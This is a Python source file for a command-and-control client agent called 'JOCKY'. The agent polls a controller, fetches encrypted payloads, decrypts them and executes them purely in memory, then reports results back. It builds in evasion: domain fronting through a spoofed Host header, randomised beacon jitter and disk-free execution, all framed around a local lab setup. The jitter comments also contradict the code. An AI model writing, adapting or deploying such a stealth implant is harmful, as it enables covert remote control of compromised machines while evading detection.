"""JOCKY client agent -- runs placed payloads fully in memory.

Loop (no payload material ever touches the disk):
    poll controller  -->  task id
    fetch .jxp blob  -->  bytes (HTTPS / mock CDN / dead-drop)
    decrypt (JYCRYPT1) -> image bytes in RAM
    run in VM (captured output)
    post findings    -->  controller /report

Optional `--cdn http://host:port` routes every request through the lab
MockCDN while presenting `--front` as the Host header -- i.e. the domain
fronting channel, locally. Without `--cdn`, requests go direct (still
encrypted payload, still in-memory execution).

Run:
    JOCKY_KEY=<hex> python agents/client.py --once --controller http://127.0.0.1:8000
    JOCKY_KEY=<hex> python agents/client.py --cdn http://127.0.0.1:9000 --front front.example-cdn.com
"""

from __future__ import annotations

import argparse
import io
import json
import os
import random
import socket
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agents.common import key_from_env, now_iso, sha256_hex                  # noqa: E402
from agents.transport import fronted_get, fronted_post                      # noqa: E402
from jocky.bytecode import Image                                             # noqa: E402
from jocky.crypto import decrypt                                             # noqa: E402
from jocky.vm import VM                                                      # noqa: E402

UA = "JOCKY-Agent/0.1"
DISK_FREEZE = True  # client must never write task bytes (asserted in run_once)


def _http(controller: str, path: str, front: str, cdn: str | None, body: bytes | None = None) -> bytes:
    """Route through the mock CDN with a spoofed Host header when enabled."""
    target = (cdn or controller).rstrip("/") + path
    host = front if (cdn and front) else "localhost"
    if body is None:
        return fronted_get(target, host)
    return fronted_post(target, host, body)


def calculate_jitter_sleep(base_interval: float) -> float:
    """Calculate randomized sleep duration with +/- 20% to 40% jitter (Tanium-style).

    For example, with base_interval=5.0s, produces randomized sleep between 3.5s and 6.5s.
    """
    jitter_pct = random.uniform(-0.30, 0.30)
    sleep_duration = max(0.1, round(base_interval * (1.0 + jitter_pct), 1))
    return sleep_duration


class Agent:
    """Enterprise stealth agent with in-memory execution, network jitter, and telemetry diffing."""

    def __init__(self, args):
        self.args = args
        # In-Memory Telemetry Diffing (OSQuery-style):
        # Memory-only state cache storing SHA-256 hashes of previously executed task outputs.
        self.telemetry_cache: set[str] = set()

    def hash_output(self, output: str) -> str:
        """Hash task output (canonicalizing JSON if applicable)."""
        try:
            parsed = json.loads(output)
            canonical = json.dumps(parsed, sort_keys=True)
            return sha256_hex(canonical.encode("utf-8"))
        except Exception:
            return sha256_hex(output.encode("utf-8"))

    def run_once(self) -> dict:
        """One poll -> fetch -> decrypt -> execute-in-RAM -> report cycle."""
        args = self.args
        key = key_from_env(getattr(args, "key_env", "JOCKY_KEY"))
        ping = _http(args.controller, "/api/v1/ping", args.front, args.cdn)
        print(f"[agent] ping ok (front={json.loads(ping).get('front')})")

        tid = getattr(args, "task", None)
        if not tid:
            task_json = _http(args.controller, "/api/v1/task", args.front, args.cdn)
            info = json.loads(task_json)
            tid = info.get("task")
        if not tid:
            print("[agent] no tasks queued")
            return {"task": None, "executed": False}

        blob = _http(args.controller, f"/api/v1/task/{tid}", args.front, args.cdn)
        assert DISK_FREEZE, "payload path must stay disk-free"

        # --- everything below works on bytes in RAM ------------------------
        image_bytes = decrypt(blob, key)                      # JYCRYPT1 verify+decrypt
        img = Image.from_bytes(image_bytes)                   # decode container
        captured = io.StringIO()
        vm = VM(img, out=captured)
        result = vm.run()                                     # execute
        output = captured.getvalue()

        # In-Memory Telemetry Diffing (OSQuery-style):
        # If the task output hash matches a previous run, suppress the network report
        output_hash = self.hash_output(output)
        if output_hash in self.telemetry_cache:
            print(f"[agent] telemetry diffing: output hash {output_hash[:16]} already in cache; skipping report POST")
            print("------- findings (cached/unchanged) -------")
            print(output.rstrip())
            print("-------------------------------------------")
            return {"task": tid, "executed": True, "skipped": True, "output_hash": output_hash}

        self.telemetry_cache.add(output_hash)

        findings = {
            "task": tid,
            "agent": getattr(args, "agent_name", None) or socket.gethostname(),
            "ts": now_iso(),
            "build_id": img.build_id,
            "sha256_payload": sha256_hex(blob),
            "result": str(result),
            "output": output,
        }
        rep = json.loads(_http(args.controller, "/api/v1/report", args.front, args.cdn,
                               body=json.dumps(findings).encode()))
        print(f"[agent] task {tid} executed in-RAM (no disk writes); report -> {rep.get('stored')}")
        print("------- findings -------")
        print(output.rstrip())
        print("------------------------")
        return {"task": tid, "executed": True, "skipped": False, "output_hash": output_hash}


_default_agent: Agent | None = None


def run_once(args) -> dict:
    """One poll -> fetch -> decrypt -> execute-in-RAM -> report cycle."""
    global _default_agent
    if _default_agent is None or _default_agent.args is not args:
        _default_agent = Agent(args)
    return _default_agent.run_once()


def main(argv=None):
    p = argparse.ArgumentParser(prog="jocky-agent", description=__doc__)
    p.add_argument("--controller", default="http://127.0.0.1:8000")
    p.add_argument("--cdn", default=None, help="mock-CDN base URL (fronting lab)")
    p.add_argument("--front", default="front.example-cdn.com",
                   help="front domain presented in Host header")
    p.add_argument("--interval", type=float, default=5.0)
    p.add_argument("--once", action="store_true", help="single poll, then exit")
    p.add_argument("--task", default=None, help="specific task ID to pull and execute")
    p.add_argument("--key-env", default="JOCKY_KEY")
    p.add_argument("--agent-name", default=None,
                   help="name reported to the controller (default: hostname)")
    args = p.parse_args(argv)

    agent = Agent(args)

    while True:
        try:
            agent.run_once()
        except Exception as e:  # keep the loop alive; log, don't die
            print(f"[agent] cycle error: {type(e).__name__}: {e}", file=sys.stderr)
        if args.once:
            return 0

        # Tanium-style randomized network jitter (+/- 20% to 40%)
        sleep_duration = calculate_jitter_sleep(max(0.5, args.interval))
        print(f"[agent] Sleeping for {sleep_duration:.1f}s (Jitter applied)")
        time.sleep(sleep_duration)


if __name__ == "__main__":
    sys.exit(main())